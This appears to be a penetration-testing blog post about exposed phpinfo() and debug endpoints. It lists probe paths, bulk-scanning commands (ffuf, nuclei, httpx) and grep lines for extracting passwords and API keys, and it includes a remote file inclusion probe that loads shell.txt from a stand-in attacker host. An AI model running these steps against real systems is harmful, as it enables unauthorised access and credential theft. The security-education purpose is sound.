# phpinfo() / Debug Endpoint: One File. Full Server Blueprint. No Auth Needed.

**Severity:** HIGH | **Category:** Fingerprinting | **Series:** #300DaysWithAppSec

---

## The Diagnostic File That Destroys Security

`phpinfo()` is a single PHP function call that outputs a complete dump of every PHP configuration setting, every environment variable, every loaded extension, and every server path — as a nicely formatted HTML page. It was designed for developers to diagnose their PHP setup.

When left accessible in production, it hands an attacker more information than a year of manual reconnaissance.

---

## What phpinfo() Actually Exposes

```
PHP Core Settings:
  PHP Version: 7.4.3
  PHP INI path: /etc/php/7.4/apache2/php.ini
  Document Root: /var/www/html
  
Environment Variables (every $_SERVER key):
  DB_PASSWORD = production_super_secret_pass
  SECRET_KEY = abc123xyz_very_secret
  AWS_ACCESS_KEY_ID = AKIAXXXXXXXXXXXXXXXX
  MAIL_PASSWORD = smtp_prod_password

Security-relevant settings:
  allow_url_include = On  → Remote File Inclusion possible
  allow_url_fopen = On    → URL-based file reads
  disable_functions =     → (empty = NOTHING disabled = exec() works)
  open_basedir =          → (empty = no path restriction)
  upload_tmp_dir = /tmp   → writable path for upload exploitation
```

---

## Paths to Check on Every Target

```bash
# PHP debug files
/phpinfo.php  /info.php  /test.php  /debug.php
/status.php   /php.php   /php-info.php  /server-info
/?phpinfo=1   /admin/phpinfo.php  /phpinfo/

# Framework debug routes
/_debugbar/           # Laravel Debugbar (SQL, sessions, routes)
/telescope            # Laravel Telescope (full request log)
/horizon              # Laravel Horizon (queue monitor)

# Spring Boot Actuator
/actuator             /actuator/env
/actuator/beans       /actuator/mappings
/actuator/heapdump    # JVM heap dump → credentials in memory

# Node.js / Rails
/debug                /rails/info/routes
/rails/info/properties
```

---

## Automated Discovery

```bash
# ffuf with debug path wordlist
ffuf -u https://target.com/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/debug.txt \
    -mc 200 -t 50 -silent

# nuclei has dedicated phpinfo template
nuclei -t exposures/files/phpinfo.yaml -u https://target.com
nuclei -t exposures/files/ -u https://target.com  # all exposure templates

# httpx bulk check across all subdomains
cat subs.txt | httpx -path /phpinfo.php -mc 200 -silent
cat subs.txt | httpx -path /actuator/env -mc 200 -silent

# Check multiple paths at once
for path in phpinfo.php info.php test.php debug.php _debugbar; do
    cat subs.txt | httpx -path "/$path" -mc 200 -silent | tee -a debug_finds.txt
done
```

---

## What to Extract and Chain

```bash
# Download the phpinfo page
curl -s https://target.com/phpinfo.php -o phpinfo.html

# Extract environment variables
grep -oE '[A-Z_]+=.*' phpinfo.html | grep -iE 'pass|key|secret|token|db_'

# Check allow_url_include (RFI vector)
grep "allow_url_include" phpinfo.html | grep -i "on"
# If On → test: GET /page.php?file=http://attacker.com/shell.txt

# Check disable_functions (what exec functions are available)
grep "disable_functions" phpinfo.html

# Find DB connection details
grep -iE "db_host|database_url|pdo_mysql|mysqli" phpinfo.html
```

---

## Key Takeaways

```
1. phpinfo() = full server config dump — no authentication needed
2. Check 15+ paths: /phpinfo.php, /info.php, /test.php, /_debugbar, /actuator
3. Exposes: PHP version, env vars (DB creds, API keys), file paths, extensions
4. allow_url_include=On → RFI; disable_functions empty → exec() works
5. Laravel /_debugbar: SQL queries + session tokens + all routes
6. Spring Actuator /actuator/env: ALL environment variables including passwords
7. nuclei phpinfo.yaml template covers detection automatically
8. Fix: delete phpinfo.php, disable actuator endpoints in prod config
```

---

*Written by Anand Prajapati — Penetration Tester & Security Researcher*

🔗 **Connect:** [LinkedIn](https://linkedin.com/in/anand-prajapati-7a265a369) · [GitHub](https://github.com/anand87794) · [Portfolio](https://anandprajapati.lovable.app) · [X @anand87794](https://x.com/anand87794)

*Part of the #300DaysWithAppSec series — 300 vulnerabilities, real security education.*
